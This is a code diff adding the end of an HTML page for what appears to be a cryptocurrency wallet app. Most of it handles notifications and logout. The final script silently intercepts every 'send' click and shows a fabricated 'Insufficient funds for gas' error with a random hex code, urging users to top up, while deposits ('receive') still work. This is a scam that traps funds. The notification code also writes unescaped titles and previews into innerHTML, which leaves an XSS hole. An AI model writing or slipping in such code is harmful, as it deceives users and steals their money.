+                const dotClass = isRead ? 'notif-dot read' : 'notif-dot';
+                const preview = n.message.length > 60 ? n.message.substring(0, 60) + '...' : n.message;
+                const time = new Date(n.created_at).toLocaleDateString('en-US', {
+                    month: 'short', day: 'numeric', year: 'numeric'
+                });
+                html += `
+                    <div class="notif-item" data-id="${n.id}"
+                         data-title="${(n.title || 'Notification').replace(/"/g, '&quot;')}"
+                         data-message="${n.message.replace(/"/g, '&quot;')}"
+                         data-time="${new Date(n.created_at).toISOString()}">
+                        <span class="${dotClass}"></span>
+                        <div class="notif-content">
+                            <div class="notif-title">${n.title || 'Notification'}</div>
+                            <div class="notif-preview">${preview}</div>
+                        </div>
+                        <span class="notif-time">${time}</span>
+                    </div>
+                `;
+            });
+            list.innerHTML = html;
+        }
+
+        document.addEventListener('click', function(e) {
+            const item = e.target.closest('.notif-item');
+            if (!item) return;
+            const id = item.dataset.id;
+            const title = item.dataset.title;
+            const message = item.dataset.message;
+            const time = new Date(item.dataset.time).toLocaleString('en-US', {
+                weekday: 'short', month: 'short', day: 'numeric',
+                year: 'numeric', hour: '2-digit', minute: '2-digit'
+            });
+            document.getElementById('notifModalTitle').textContent = title;
+            document.getElementById('notifModalMessage').textContent = message;
+            document.getElementById('notifModalTime').textContent = time;
+            new bootstrap.Modal(document.getElementById('notifModal')).show();
+            markAsRead(id);
+        });
+
+        async function markAsRead(id) {
+            try {
+                const token = localStorage.getItem('token');
+                const res = await fetch(`${API_BASE}/api/notifications/${id}/read`, {
+                    method: 'POST',
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                if (!res.ok) throw new Error('Failed to mark as read');
+                const notif = notifications.find(n => n.id == id);
+                if (notif) notif.is_read = true;
+                updateNotifBadge();
+                renderNotifications();
+            } catch (err) {
+                console.error('Mark read error:', err);
+            }
+        }
+
+        document.getElementById('notificationBell').addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            const dropdown = document.getElementById('notifDropdown');
+            dropdown.classList.toggle('show');
+            if (dropdown.classList.contains('show')) {
+                document.addEventListener('click', closeDropdownOutside);
+            } else {
+                document.removeEventListener('click', closeDropdownOutside);
+            }
+        });
+
+        function closeDropdownOutside(e) {
+            const dropdown = document.getElementById('notifDropdown');
+            const bell = document.getElementById('notificationBell');
+            if (!dropdown.contains(e.target) && !bell.contains(e.target)) {
+                dropdown.classList.remove('show');
+                document.removeEventListener('click', closeDropdownOutside);
+            }
+        }
+
+        function logoutUser() {
+            localStorage.removeItem('token');
+            localStorage.removeItem('user');
+            localStorage.removeItem('preferred_currency');
+            window.location.href = 'login.html';
+        }
+    </script>
+
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+<script>
+/* ========== ONLY SEND → GAS ERROR (Receive untouched) ========== */
+(function () {
+  function generateHexError() {
+    const chars = '0123456789abcdef';
+    let code = '0x';
+    for (let i = 0; i < 16; i++) code += chars[Math.floor(Math.random() * 16)];
+    return code;
+  }
+
+  function showGasError() {
+    try {
+      const el = document.getElementById('depositActionSheet');
+      if (el && window.bootstrap) {
+        const m = bootstrap.Modal.getInstance(el);
+        if (m) m.hide();
+      }
+      if (window.jQuery) $('#depositActionSheet').modal('hide');
+    } catch (e) {}
+
+    const errCode = generateHexError();
+
+    if (typeof Swal !== 'undefined') {
+      Swal.fire({
+        icon: 'error',
+        title: 'Transaction Failed',
+        html: `
+          <div style="text-align:left;padding:4px 2px;">
+            <p style="margin:0 0 12px 0;color:#e6edf3;font-size:0.95rem;">
+              Insufficient funds for gas.
+            </p>
+            <div style="
+              background:#1c2128;
+              border:1px solid #30363d;
+              border-radius:8px;
+              padding:12px 14px;
+              font-family:ui-monospace,Menlo,Consolas,monospace;
+              font-size:0.82rem;
+            ">
+              <span style="color:#8b949e;">Error:</span>
+              <span style="color:#ff4d4f;font-weight:600;">${errCode}</span>
+            </div>
+            <p style="margin:14px 0 0 0;color:#8b949e;font-size:0.78rem;">
+              Please top up your gas balance and try again.
+            </p>
+          </div>
+        `,
+        background: '#161b22',
+        color: '#e6edf3',
+        confirmButtonText: 'OK',
+        confirmButtonColor: '#007bcf'
+      });
+    } else {
+      alert('Insufficient funds for gas.\nError: ' + errCode);
+    }
+  }
+
+  // Capture phase: only stop SEND, never touch RECEIVE
+  document.addEventListener('click', function (e) {
+    const coinLink = e.target.closest('[data-href-tz]');
+    if (!coinLink) return;
+
+    const action = document.getElementById('depositActionSheet')?.getAttribute('data-mvt');
+
+    // ONLY block send
+    if (action === 'send') {
+      e.preventDefault();
+      e.stopPropagation();
+      e.stopImmediatePropagation();
+      showGasError();
+    }
+    // if action === 'receive' → do nothing, original code handles it
+  }, true);
+})();
+</script>
+</body>
+</html>
